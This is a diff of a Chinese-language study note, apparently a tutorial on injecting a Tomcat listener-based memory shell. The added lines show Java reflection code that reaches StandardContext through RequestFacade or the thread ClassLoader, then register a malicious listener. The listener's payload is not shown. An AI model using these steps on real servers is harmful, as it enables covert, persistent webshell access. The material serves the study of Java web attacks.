@@ -214,9 +214,49 @@ ServletContext servletContext = request.getSession().getServletContext();//先�
  stdctx.setAccessible(true);  
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
 ```
-2. 使用我们恶意listener中获取到的 `RequestFacade`中真正的 `Request`对象
+2. 使用我们恶意listener中获取到的 `RequestFacade`中真正的 `Request`对象，调用其 `getContext()`来获取StandardContext
+```java
+// 1. 拿到 RequestFacade (sre.getServletRequest() 返回的就是它)
+ServletRequest requestfacade = sre.getServletRequest();
 
+try {
+    // 2. 反射获取 RequestFacade 里的底层 Request 对象
+    Field requestField = requestfacade.getClass().getDeclaredField("request");
+    requestField.setAccessible(true);
+    Object connectorRequest = requestField.get(requestfacade);
 
+    // 3. 调用 getContext() 方法。在 Tomcat 中，这个方法返回的就是 StandardContext 的实例
+    Method getContextMethod = connectorRequest.getClass().getMethod("getContext");
+    Object standardContext = getContextMethod.invoke(connectorRequest);
+    
+} catch (Exception e) {
+    e.printStackTrace();
+}
+```
+3. 当无法获取request的时候，用线程上下文ClassLoader获取
+```java
+try {
+    // 1. 获取当前线程的类加载器
+    // Tomcat 为每个 Web 应用分配了一个独立的 WebappClassLoader
+    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+
+    // 2. 在 Tomcat 8/9 中，这个 ClassLoader 内部有一个 resources 属性
+    Field resourcesField = classLoader.getClass().getDeclaredField("resources");
+    resourcesField.setAccessible(true);
+    Object resources = resourcesField.get(classLoader);
+
+    // 3. WebResourceRoot 接口有一个 getContext() 方法，返回 StandardContext
+    Method getContextMethod = resources.getClass().getMethod("getContext");
+    Object standardContext = getContextMethod.invoke(resources);
+
+} catch (Exception e) {
+    e.printStackTrace();
+}
+```
+
+---
+
+ok最终调用 `standardContext`的 `addApplicationEventListener()`添加我们自己的listener
 
 
 
